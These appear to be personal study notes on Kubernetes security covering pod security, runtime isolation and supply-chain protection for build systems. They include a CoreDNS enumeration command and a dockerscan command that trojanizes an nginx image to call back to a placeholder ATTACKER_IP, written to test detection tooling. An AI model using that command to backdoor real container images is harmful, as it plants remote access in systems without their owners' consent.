#TODO 
- Understand k8s threat model on Github in detail

## Tools
- [[Deciuous]()](https://deciduous.app) Create attack trees as code
- https://kubesec.io/ - Recurity risk analysis (scans yaml files)
- dockerscan

> In their threat modeling method, they use attack trees to come up with the threats and then use STRIDE to analyze them? -> TBC


# Chapter 2: Pod security

The pod is the first line of defense and the most important part of a cluster to protect. Application code changes frequently and is likely to be a source of potentially exploitable bugs.

Pod vs node architecture
![[Pasted image 20250805105730.png]]

First line of defense is network interfaces and public-facing pods

A **DaemonSet** in Kubernetes is a resource that ensures a copy of a specific pod runs on all (or a subset of) nodes in a cluster. It is used to deploy background services that need to run on every node, such as logging agents, monitoring daemons, or network proxies.

A pod is a trust boundary encompassing all the containers inside, including their identity and access. An attacker controlling a containerized process may have control of the networking, some or all of the storage, and potentially other containers in the pod.

The lifecycle of a pod is controlled by the `kubelet`, the Kubernetes API server’s deputy, deployed on each node in the cluster to manage and run containers.

Pods can also have storage attached by Kubernetes, using the ([Container Storage Interface (CSI)](https://oreil.ly/S8v3B)), which includes the PersistentVolumeClaim and StorageClass

Kubelets have an API which you can query too.

**Labels in pod spec**
Typos in labels mean they do not match the intended selectors, and so can inadvertently introduce security issues such as:

- Exclusions from expected network policy or admission control policy
- Unexpected routing from service target selectors
- Rogue pods that are not accurately targeted by operators or observability tooling

**namespace**
From within a pod it’s possible to infer the current namespace from the DNS resolver configuration in _/etc/resolv.conf_ (which is `secret-namespace` in this example):

```
grep -o `"search [^ ]*"` /etc/resolv.conf search secret-namespace.svc.cluster.local
```

**container images**
Images should always be referenced by SHA256 or use signed tags


`cgroups` are a useful resource constraint. `cgroups` v2 offers more protection, but **`cgroups` v1 are not a security boundary and [they can be escaped easily](https://oreil.ly/uDhso).**


**CoreDNS**
The default Kubernetes CoreDNS installation leaks information about its services, and offers an attacker a view of all possible network endpoints (see Figure 2-10). Of course they may not all be accessible due to a network policy in place, as we will see in “Traffic Flow Control”.

DNS enumeration can be performed against a default, unrestricted CoreDNS installation. To retrieve all services in the cluster namespace (output edited to fit):

```
root@hack-3-fc58fe02:/ [0]# dig +noall +answer \
 srv any.any.svc.cluster.local | 
 sort --human-numeric-sort --key 7
 
any.any.svc.cluster.local. 30 IN SRV 0 6 53 kube-dns.kube-system.svc.cluster... any.any.svc.cluster.local. 30 IN SRV 0 6 80 frontend-xternal.default.svc.clu... any.any.svc.cluster.local. 30 IN SRV 0 6 80 frontend.default.svc.cluster.local.
```

This is a problem in a multi-tenant cluster and DNS resolving must be protected using e.g. OPA policy plugin

**SecurityContext**

The `securityContext` is your most effective tool to prevent container breakout.
- seccomp limits system calls to the kernel
- SELinux and AppArmor can protect userspace (files, dirs, devices) too


# Chapter 3: Container runtime isolation

**Zero-days and container breakouts are rare in comparison to simple security-sensitive misconfigurations.**

`kubeadm` installs Kubernetes with `runc` as its container runtime, using `cri-o` or `containerd` to manage it. -> `runc` is the runtime docker is built on

![[Pasted image 20250807095401.png]]

RKE2 launches control plane components as static pods, managed by the kubelet. The embedded container runtime is containerd.

You have two main reasons for isolating a workload or pod—it may have access to sensitive information and data, or it may be untrusted and potentially hostile to other users of the system:
- *sensitive*: obvious
- *Untrusted*: examples
	- VM workloads on a cloud provider’s hypervisor
	- CI/CD infrastructure subject to build-time supply chain attacks
	- Processing of complex files with potential parser errors


Next-generation sandboxes combine container and virtualization techniques (see Figure 3-3) to reduce workloads’ access to the kernel.
![[Pasted image 20250807100245.png]]
![[Pasted image 20250807102400.png]]


_Rootless_ means the **low-level container runtime process that creates the container is owned by an unprivileged user**, and so container breakout via the process tree only escapes to a nonroot user, nullifying some potential attacks.

```
When the kernel, OpenSSL, and other critical software are written in C, we just want to move everything as far away from trusted kernel space as possible.
```

**gVisor and Firecracker** (written in Golang and Rust, respectively) both operate on the premise that their statically typed system call proxying (between the workload/guest process and the host kernel) is more secure for consumption by untrusted workloads than the Linux kernel itself, and that performance is not significantly impacted.

The **Kata Containers** runtime launches each container on a guest Linux kernel. Each Linux system is on its own hardware-isolated VM,

**Kubernetes supports running multiple container runtimes simultaneously**; in Kubernetes, [Runtime Class](https://oreil.ly/dRHzA) is stable from v1.20 on. This means a Kubernetes worker node can host pods running under different Container Runtime Interfaces (CRIs), which greatly enhances workload separation.

# Chapter 4: Applications and Supply chain

See [[Supply Chain Security]]

## Compromising container images
Try dockerscan to trojanize a standard container (e.g. nginx) and check which tools will pick this up.

```
$ docker save nginx:latest -o webserver.tar 
$ dockerscan image modify trojanize webserver.tar \ 
  --listen "${ATTACKER_IP}" --port "${ATTACKER_PORT}" 
  --output trojanized-webserver
```

## Detecting compromised containers

## Software factory pattern
A Software Factory is a form of CI/CD that focuses on self-replication. It is a build system that can deploy copies of itself, or other parts of the system, as new CI/CD pipelines.

Cfr DoD reference architecture: https://www.doncio.navy.mil/CHIPS/ArticleDetails.aspx?ID=14700

Cryptographic signing of build steps and artifacts can increase trust in the system, and can be revalidated with an admission controller such as [portieris](https://oreil.ly/mY9eu) for Notary and [Kritis](https://oreil.ly/R33SG) for Grafeas.


### Protect integrity of build containers themselves
###### Warning
An attack on source code prior to building an artifact or generating an SBOM from it is still trusted, even if it is actually malicious, as with SUNBURST. **This is why the build infrastructure must be secured.**

To defend from malicious builds, you should begin with static analysis using Hadolint and conftest to enforce your policy. For example:

```
$ docker run --rm -i hadolint/hadolint < Dockerfile
/dev/stdin:3 DL3008 Pin versions in apt get install.
/dev/stdin:5 DL3020 Use COPY instead of ADD for files and folders
```

Conftest wraps OPA and runs Rego language policies (see “Open Policy Agent”):

```
$ conftest test --policy ./test/policy --all-namespaces Dockerfile
2 tests, 2 passed, 0 warnings, 0 failures, 0 exceptions
```

If the Dockerfile conforms to policy, scan the container build workspace with tools like trivy. You can also build and then scan, although this is slightly riskier if an attack spawns a reverse shell into the build environment.

### Vetting third party software

Either trust the source who signed it -> SALSA level 3!
Or, verify it yourself. **There is no other option**
![[Pasted image 20250808153948.png]]

https://www.aquasec.com/products/container-analysis/ does this, is there an open-source alternative?

**“reverse uptime"** = the correlation between risk of an application’s compromise and the time since its deployment

#### To protect your build system:

- Give developers root access to integration and testing environments, _not_ build and packaging systems.
- Use ephemeral build infrastructure and protect builds from cache poisoning.
- Generate and distribute SBOMs so consumers can validate the artifacts.
- Run intrusion detection on build servers.
- Scan open source libraries and operating system packages.
- Create reproducible builds on distributed infrastructure and compare the results to detect tampering.
- Run hermetic, self-contained builds that only use what’s made available to them (instead of calling out to other systems or the internet), and avoid decision logic in build scripts.
- Keep builds simple and easy to reason about, and security review and scan the build scripts like any other software.